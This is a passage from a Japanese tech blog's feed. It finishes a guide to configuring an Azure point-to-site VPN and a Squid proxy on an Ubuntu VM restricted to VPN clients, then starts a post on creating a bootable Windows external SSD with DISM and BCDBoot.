    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 59.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABmklEQVQoz4WT23LbIBRF/f+f4sZxO8l7JnlJ/sB9cXNr7EhCFwTIEhftHo5cRvE4CTN7EAMsNpujxTbTeHp8xMvzM/b7PassSzRNg6qqIIRAlmUYxzHpq7YQTQutNbz3rEAbjPVwYYQPgQGBeucsrB14zRx+qkUuFZRs0sIIv725w2q5wtWva4isRHAjbO/gBs99CJPLs0ClB0gC9n3Pi6SUyN9zvL3u0DYK9mDhh8AwT3IEHI9AnLn9QtaSM/sPjNlFkOvJsccEmWsGPOuwaiRdwafDZNsi22Uo3gVDT2UPjjP9PMOyxuHQwVlLwTs0dY3ouq5qcgJ2M2m6IvdfvXJe5Ni9/UWR5zBaoaQyEaKAIqfeu/SySrX4s91SKZXQSvE4idZ2XTc5rFVHA5NOaGkybiryjNxWrHjQ780Gq4sL/Fyvsb68TIrjH8slHu7vJ4et0h8KNr5yhCpyEbOah/9dOzpsP4QcgfEPMUZzpvHacd5QfRpjjjFYLvRJLuXPQFGXGPohnRLLJm7gv8Na/rbHDVH8fSI7A/4DfMygpJYWvYEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4cf7cb7d01a1def6252ca3065e197ac9/8ac56/image-20220304204407809.webp 240w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/d3be9/image-20220304204407809.webp 480w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/e46b2/image-20220304204407809.webp 960w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/c18de/image-20220304204407809.webp 1052w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4cf7cb7d01a1def6252ca3065e197ac9/8ff5a/image-20220304204407809.png 240w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/e85cb/image-20220304204407809.png 480w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/d9199/image-20220304204407809.png 960w,
/static/4cf7cb7d01a1def6252ca3065e197ac9/218a4/image-20220304204407809.png 1052w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4cf7cb7d01a1def6252ca3065e197ac9/d9199/image-20220304204407809.png&quot;
            alt=&quot;image-20220304204407809&quot;
            title=&quot;image-20220304204407809&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;その後、「認証の種類」を「Azure証明書」に設定し、先ほどコピーしたルート証明書を貼り付けて保存します。&lt;/p&gt;
&lt;p&gt;設定が完了すると「VPNクライアントのダウンロード」が可能になるので、ここからダウンロードしたクライアントをVPN接続に使用するWindowsマシンにインストールします。&lt;/p&gt;
&lt;h2 id=&quot;windowsでvpnを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windows%E3%81%A7vpn%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;windowsでvpnを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WindowsでVPNを設定する&lt;/h2&gt;
&lt;p&gt;クライアントがインストールできたら、WindowsのVPNの設定を開き、Azureに接続します。&lt;/p&gt;
&lt;p&gt;無事に接続できれば、以下のように仮想ネットワークに設定したAzure側のローカルIPアドレスでSSH接続などを行うことができます。&lt;/p&gt;
&lt;p&gt;※ VM側のセキュリティグループの許可設定を忘れずに。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8eb3966f00e81c5e29e709906e53c39b/e548f/image-20220304210335018.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACB0lEQVQ4y2VT2XLiQBDz4wbwfR/4wGASwOQg2aS2av//s7StNuMN5GFKc1mtlsbWaVjj+bHG5dThcuzw8tRgHErsN6mMAvsux7ZJ8dQXihxDm+ng3nFXCpYoUx+r5S9YoxDy4FE+Pu9rHdsm0/XHuEGVBcgTD+s81I+4LgS55pzYFBGKxIe9eoD1dmy1CgneRSULjPv/Rd4OreJhW0mBDmfphl2wq7Pc4/dGfRTasJoywqZOQGSLZeajreJZDc+4LmQ/Cmwkkat3cjlPY1fVe+4Sjv2gaHVVgr+XAX9ed6iFNA5dfJ570Nuvly2+nnvxtsVv2TtsSy3Mj1fSnmMvYMvcdRZKRrQyqbBrU1TiBatnsaeK6iLUNoi1eLRZJ3IvE3WB3HER+KuZyJCpQhJUeaCEvbRHlWwlDp25QCJzEnGPZyzAeeBNpDcKmzLWUPo6Fd8CdOvJT01S1BHZ/nFXqZ8kZJq5pDq1v7hVyCA+xafXQ6MtMdEkcjQAo3J6b5Wm34sNLEqVJGR3LDIT0i/zYDVxuVxcE6Z/RJMiA3DufPvRMon4N1AdU+Q7pMqTKOJb45xqlPzqNe/Tb99b3pCpQl+M5SS4orn03fBQEuWaZ7SAdkxntwkr4SDVqIJIhfz1GMI4VKr6JMhzekhltIWB3BPNhKE/mf89hPSqwvwZRLNnHvJ9q2b8Aw/lZ5EFks3UAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8eb3966f00e81c5e29e709906e53c39b/8ac56/image-20220304210335018.webp 240w,
/static/8eb3966f00e81c5e29e709906e53c39b/d3be9/image-20220304210335018.webp 480w,
/static/8eb3966f00e81c5e29e709906e53c39b/e46b2/image-20220304210335018.webp 960w,
/static/8eb3966f00e81c5e29e709906e53c39b/1e975/image-20220304210335018.webp 975w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8eb3966f00e81c5e29e709906e53c39b/8ff5a/image-20220304210335018.png 240w,
/static/8eb3966f00e81c5e29e709906e53c39b/e85cb/image-20220304210335018.png 480w,
/static/8eb3966f00e81c5e29e709906e53c39b/d9199/image-20220304210335018.png 960w,
/static/8eb3966f00e81c5e29e709906e53c39b/e548f/image-20220304210335018.png 975w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8eb3966f00e81c5e29e709906e53c39b/d9199/image-20220304210335018.png&quot;
            alt=&quot;image-20220304210335018&quot;
            title=&quot;image-20220304210335018&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ちなみに僕の環境のネットワークセキュリティグループはこんな感じにしてみました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/6a7ba15e8f1506feaa048ce87f057b43/11a8f/image-20220304221534416.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 23.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA50lEQVQY011QyU7FMBDr/38VF84gDhw4gQQP0TZ9TZplspqZCSdGclpZsT3O8vF5gzEG+3HH/Yo4nMd5ngghYN93BMoYkJnn/3HU8fJNeP0hPN8SFmsdYgxw3iPmitqB3gdyzqi1IpeGEJOKW2sKMScOkjG+4OHtwNNXwuN7wDJGV2GKcW4xJogIncUC7y8Vp5Swrqved86hlsoBhBTM374NSykFAqktVUXUe2cTr7yIr2saSsi2bfoVLvHmuRAOa9C4FXGrRQQCa61Wl6piKMbCS8XI248xn0F44TSYucahkRvoP9//Be67hRYwNfTTAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/6a7ba15e8f1506feaa048ce87f057b43/8ac56/image-20220304221534416.webp 240w,
/static/6a7ba15e8f1506feaa048ce87f057b43/d3be9/image-20220304221534416.webp 480w,
/static/6a7ba15e8f1506feaa048ce87f057b43/e46b2/image-20220304221534416.webp 960w,
/static/6a7ba15e8f1506feaa048ce87f057b43/4cec6/image-20220304221534416.webp 1272w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/6a7ba15e8f1506feaa048ce87f057b43/8ff5a/image-20220304221534416.png 240w,
/static/6a7ba15e8f1506feaa048ce87f057b43/e85cb/image-20220304221534416.png 480w,
/static/6a7ba15e8f1506feaa048ce87f057b43/d9199/image-20220304221534416.png 960w,
/static/6a7ba15e8f1506feaa048ce87f057b43/11a8f/image-20220304221534416.png 1272w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/6a7ba15e8f1506feaa048ce87f057b43/d9199/image-20220304221534416.png&quot;
            alt=&quot;image-20220304221534416&quot;
            title=&quot;image-20220304221534416&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;この後セットアップするプロキシのポートも開放してあります。&lt;/p&gt;
&lt;p&gt;「ソース」を「VirtualNetwork」に設定しているので、グローバルIPでは接続できず、P2S VPN接続でAzureの仮想ネットワークに接続した端末からの接続のみを受け入れる構成になっているはずです。&lt;/p&gt;
&lt;p&gt;接続には登録したルート証明書に対応するクライアント証明書が必要になるので、かなりセキュアになった感じありますね。&lt;/p&gt;
&lt;h2 id=&quot;azurevm上にプロキシを構成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#azurevm%E4%B8%8A%E3%81%AB%E3%83%97%E3%83%AD%E3%82%AD%E3%82%B7%E3%82%92%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;azurevm上にプロキシを構成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AzureVM上にプロキシを構成する&lt;/h2&gt;
&lt;p&gt;最後に、AzureVM上にSquidを構築してプロキシ化したいと思います。&lt;/p&gt;
&lt;p&gt;マシンはUbuntu20.04を使用しています。&lt;/p&gt;
&lt;p&gt;まずはアップデートを行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; upgrade -y
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;vim&lt;/span&gt; -y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いてSquidをインストールして設定ファイルを編集します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; squid -y
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; /etc/squid/squid.conf /etc/squid/squid.conf.origin
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;vim&lt;/span&gt; /etc/squid/squid.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回はとりあえず最低限の設定をしたいので、&lt;code class=&quot;language-text&quot;&gt;http_port&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;http_access&lt;/code&gt;の2箇所を変更します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Squid normally listens to port 3128&lt;/span&gt;
http_port &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;VMのプライベートIP&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;:3128

acl vGateways src &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;仮想ネットワークゲートウェイのIPレンジ&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
http_access allow vGateways&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;http_port&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;&amp;lt;VMのプライベートIP&gt;:3128&lt;/code&gt;のように指定することで、特定のインターフェースのポートのみ通信を受け入れるように構成できます。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;http_access&lt;/code&gt;に仮想ネットワークゲートウェイのIPレンジを設定することで、VPN経由の通信のみがプロキシを利用できるようにします。&lt;/p&gt;
&lt;p&gt;これで最低限の設定はOKなので、Squidを起動します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; systemctl &lt;span class=&quot;token builtin class-name&quot;&gt;enable&lt;/span&gt; squid
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; systemctl restart squid&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;接続テスト&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%8E%A5%E7%B6%9A%E3%83%86%E3%82%B9%E3%83%88&quot; aria-label=&quot;接続テスト permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;接続テスト&lt;/h2&gt;
&lt;p&gt;VPNを構成したWindowsマシンでAzureVM上のサーバに対してプロキシ設定を実施します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 815px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/ef916/image-20220304212806392.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACyElEQVQ4y21TaVPaUBTFFdz3DZRNcKS0VsSqg0wtjlq1fnF0BBGSkIQlxCxi1f7703sfjbUdP5y5L8nkvHvuOdd3dHSE0/MzfD08RP5bAfuMQgEHx8eIJxNYXV3F2toaJiYmMDY2hvHxcYHR0VEMDg7C7/f/A9/l5SVKtyV8v7jAwckpCmc/cHh2jvOra3zMbCG4tIRkMolQKIQlOjOCwSBmZ2ffJ9R1Ha7romkYqDY03KhVlOQ7VNQaNrNZhOjnVCqF4eFh9PT0oL+/HwMDAwL/kwlCRVFgmiaqsoRyjYjqVVSUMhRVQSa7hfn5edHR9PS0OHNl0rfo6+sTF3DHPk3T4Dx0oDaaAlqrBUnTUa23sLm9g/DKCtbX1xGJRBCPx7G8vCzmOTc3h5mZGVEXFxcxOTnZ7VCSZRiWTUT3RGih1jBRlDVclBWkNrcRi0axsbEhwGTcIf/M3fIcmXBhYQFTU1N/JdudRzTMDqqaDaVuoSwruCpf48OnFKLUWTgcFmawrN7eXiGR4cn1zkKyTB0+PD2j7TyjotuQiVCtqzDMG+zsppFIJMjhIIaGhgQ4OtxhIBB43xRJkYTkWoPJHKhNC3VDg9u5Qy7/mToLClM8QpbI2WRiJuCu3sInaZKQXGvaZAbNkmrd0GG7MhFmSW4E6XQamUxGEPEc+QIeAY+CL2DD2JiuZF1G5+UX2u4L6uaT6FQnp22nhf38nhg4b0qUzGEjeEu8jeHK+RwZGRG1S0h5syg2jfufUI3HP4RtWI6D3H5ODNsf8L9uBcvm+fHq8bMXdO+7r6aqaFsOJN1CRSNDmkxownQfSHJexIHlsMQVyqQHfub3LJsveSUs3d5S/lpkCM1QmNIlvHc72MvlxM+cQZbI0rgzBkvkyu89cwRhsViEojdod1u0em0yxqAsNoXzX3b3RHhjsZgg8LLmSfR22iPj+htVH82nQkLdoAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/8ac56/image-20220304212806392.webp 240w,
/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/d3be9/image-20220304212806392.webp 480w,
/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/0ea8f/image-20220304212806392.webp 815w&quot;
              sizes=&quot;(max-width: 815px) 100vw, 815px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/8ff5a/image-20220304212806392.png 240w,
/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/e85cb/image-20220304212806392.png 480w,
/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/ef916/image-20220304212806392.png 815w&quot;
            sizes=&quot;(max-width: 815px) 100vw, 815px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/fe9ae4b91175dc4eeb8f5dcb32e030cc/ef916/image-20220304212806392.png&quot;
            alt=&quot;image-20220304212806392&quot;
            title=&quot;image-20220304212806392&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで適当なサイトにアクセスしたとき、アクセス元のアドレスがAzureVMに割り当てているグローバルIPアドレスに変更されていればOKです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 730px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/cb0e0cb96c6948928636e233cb8f0826/e9beb/image-20220304212900959.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB50lEQVQoz1WOS0+TYRCFv5/gDhcaFxrXxn+gO010ZbwsjHjZmLjSpCEiBUxqvLBgURTazwItIRCiMcTSUkKgtjUmGAq0FKn2Tu/QllJotZfHgbhx8eSdmfecmaMMOX5gFEbmgwzaNxiYWUc/48cwu4F5ISi9nyGpB2yH83XRBI506lyQ0YWf9E37jtB9XGXKE0a5rhnkdud72rtM3Owwck0zxI0Olfu9Yzx6McGD5+Pc67XQ3mPhTrdZegu3nqpHnrtaE1cev+Pqk0EuPuxHZ5pFMQxoGFW7GTZ0MWLUyvuMSYsOx7Qe+yc9TruRiREdU2NvmDS/ZHxYh/q2E5PoDj1mVcuYqUdmGtyLH1BgCVj+j1jCy4rPSyi6zJrfy6XLF2g7fozTZ05w8lQb586fpVB0iNYnfP/nW6LZCqI0m05aLQ/Npot63SkfLrJZN5Goh3Tmq/ANt1vFan2FzdaH9fNr5uf7qVTmqFadNBou4YuwSK0WQKlUVonH/KTTAaq1HMl0mNJunHojw04hwv7+lhwpcnCQlQRFqUuSLsXvPznRbZFMhUSTk0CbsnANJZ9fIZHYIJkMUCzFSaV/ScKwmOJkMiFy+QiFQoxsLszOTkw0CUkdZm8vSbm8RX47ym45LQeD7B9s8hcCBcNXc4vukgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/cb0e0cb96c6948928636e233cb8f0826/8ac56/image-20220304212900959.webp 240w,
/static/cb0e0cb96c6948928636e233cb8f0826/d3be9/image-20220304212900959.webp 480w,
/static/cb0e0cb96c6948928636e233cb8f0826/87ca7/image-20220304212900959.webp 730w&quot;
              sizes=&quot;(max-width: 730px) 100vw, 730px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/cb0e0cb96c6948928636e233cb8f0826/8ff5a/image-20220304212900959.png 240w,
/static/cb0e0cb96c6948928636e233cb8f0826/e85cb/image-20220304212900959.png 480w,
/static/cb0e0cb96c6948928636e233cb8f0826/e9beb/image-20220304212900959.png 730w&quot;
            sizes=&quot;(max-width: 730px) 100vw, 730px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/cb0e0cb96c6948928636e233cb8f0826/e9beb/image-20220304212900959.png&quot;
            alt=&quot;image-20220304212900959&quot;
            title=&quot;image-20220304212900959&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.cman.jp/network/support/go_access.cgi&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;アクセス情報【使用中のIPアドレス確認】&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は東日本リージョンで構成しましたが、同じ手順で海外リージョンのマシンをプロキシにすれば国外のIPを使用して接続できるようになるのかな？&lt;/p&gt;
&lt;p&gt;手順も簡単なので有用ですね。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[DISMとBCDBootでUSB接続した外付けSSDから起動可能なWindowsメディアを作成する]]></title><link>https://kashiwaba-yuki.com/note-how-to-create-bootmedia-external-ssd</link><guid isPermaLink="false">https://kashiwaba-yuki.com/note-how-to-create-bootmedia-external-ssd</guid><pubDate>Thu, 03 Mar 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回は外付けSSDからUSB経由でWindowsを起動可能なブートメディアを作成していきます。&lt;/p&gt;
&lt;p&gt;外付けSSDからUSB経由でWindowsを起動可能なブートメディアの作成方法についてググると非常に多くの情報がでてきます。&lt;/p&gt;
&lt;p&gt;Windowsマシンでは外付けSSDからのブートは実現できないとか、有料アプリを使えば実現できるとか、Macなら可能とか、ほんとに色々な情報があり混乱しました。&lt;/p&gt;
&lt;p&gt;結論から言って、本記事執筆時点で最新のWindows10 21H2のバージョンでも外付けSSDからUSB経由で起動可能なブートメディアを作成することはできます。&lt;/p&gt;
&lt;p&gt;以下の記事の手順でブート可能なSSDを作成することができました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://nisimura.org/usb_ssd_windows_install/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;USBの外付けSSD/HDDからWindows10を起動する方法（無料/手動でWindows to GoをSSD/HDDにインストールする方法） | 西村誠一のパソコン無料サポートとWindowsフリーソフトblog&lt;/a&gt;&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 